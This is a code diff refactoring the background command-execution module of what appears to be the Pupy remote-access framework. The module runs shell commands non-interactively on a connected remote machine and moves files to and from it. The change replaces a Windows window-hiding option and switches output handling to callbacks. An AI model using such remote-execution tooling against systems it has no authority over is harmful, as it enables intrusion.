@@ -12,6 +12,7 @@ import re
 import stat
 import pupygen
 import tempfile
+import threading
 
 from rpyc.utils.classic import upload
 
@@ -21,10 +22,9 @@ __class_name__="PExec"
 class PExec(PupyModule):
     """ Execute shell commands non-interactively on a remote system in background using popen"""
 
-    pool_time = 1
     pipe = None
     completed = False
-    terminate = False
+    terminate = threading.Event()
     updl = re.compile('\^([^\^]+)\^([<>])([^\^]+)\^')
     # daemon = True
 
@@ -43,9 +43,9 @@ class PExec(PupyModule):
             help='Don\'t catch stderr',
         )
         self.arg_parser.add_argument(
-            '-F',
+            '-N',
             action='store_true',
-            help='Don\'t hide application window (Windows only)'
+            help='Don\'t receive stdout (read still be done on the other side)',
         )
         self.arg_parser.add_argument(
             '-s',
@@ -70,11 +70,13 @@ class PExec(PupyModule):
         to_download = []
         to_delete = []
 
-        rsubprocess = self.client.conn.modules['subprocess']
-        ros = self.client.conn.modules['os']
+        ros = None
 
         for i, arg in enumerate(cmdargs):
             for local, direction, remote in self.updl.findall(arg):
+                if not ros:
+                    ros = self.client.conn.modules['os']
+
                 if local == '$SELF$':
                     platform = self.client.platform()
                     if not platform in ('windows', 'linux'):
@@ -161,26 +163,13 @@ class PExec(PupyModule):
                     )
                 ]
 
-        if self.client.is_windows():
-            if not args.F:
-                startupinfo = rsubprocess.STARTUPINFO()
-                startupinfo.dwFlags |= rsubprocess.STARTF_USESHOWWINDOW
-                cmdenv.update({
-                    'startupinfo': startupinfo,
-                })
-        else:
-            cmdenv.update({
-                'close_fds': True,
-            })
-
-        popen = self.client.conn.modules['pupyutils.safepopen'].SafePopen
-        self.pipe = popen(cmdargs, **cmdenv)
-
-        rdatetime = self.client.conn.modules['datetime']
+        self.pipe = self.client.conn.modules[
+            'pupyutils.safepopen'
+        ].SafePopen(cmdargs, **cmdenv)
 
         if hasattr(self.job, 'id'):
-            self.success('Started at (local:{} / remote:{}): '.format(
-                datetime.datetime.now(), rdatetime.datetime.now()))
+            self.success('Started at {}): '.format(
+                datetime.datetime.now()))
 
         self.success('Command: {}'.format(' '.join(
             x if not ' ' in x else "'" + x + "'" for x in cmdargs
@@ -215,23 +204,28 @@ class PExec(PupyModule):
 
             log = open(log, 'w')
 
-        for data in self.pipe.execute():
-            if data:
-                if not self.terminate:
-                    self.log(data)
-                if log:
-                    log.write(data)
+        close_event = threading.Event()
+
+        def on_read(data):
+            self.log(data)
+            if not self.terminate.is_set():
+                log.write(data)
+
+        def on_close():
+            close_event.set()
+
+        self.pipe.execute(on_close, None if args.N else on_read)
+        while not ( self.terminate.is_set() or close_event.is_set() ):
+            close_event.wait()
 
         if log:
             log.close()
 
         if self.pipe.returncode == 0:
-            self.success('Successful at (local:{} / remote:{}): '.format(
-                datetime.datetime.now(), rdatetime.datetime.now()))
+            self.success('Successful at {}: '.format(datetime.datetime.now()))
         else:
-            self.error('Ret: {} at (local:{} / remote:{})'.format(
-                self.pipe.returncode, datetime.datetime.now(), rdatetime.datetime.now(),
-                ))
+            self.error(
+                'Ret: {} at {}'.format(self.pipe.returncode, datetime.datetime.now()))
 
         for remote, local in to_download:
             if ros.path.exists(remote):
@@ -248,5 +242,5 @@ class PExec(PupyModule):
         if not self.completed and self.pipe:
             self.error('Stopping command')
             self.pipe.terminate()
-            self.terminate = True
+            self.terminate.set()
             self.error('Stopped')
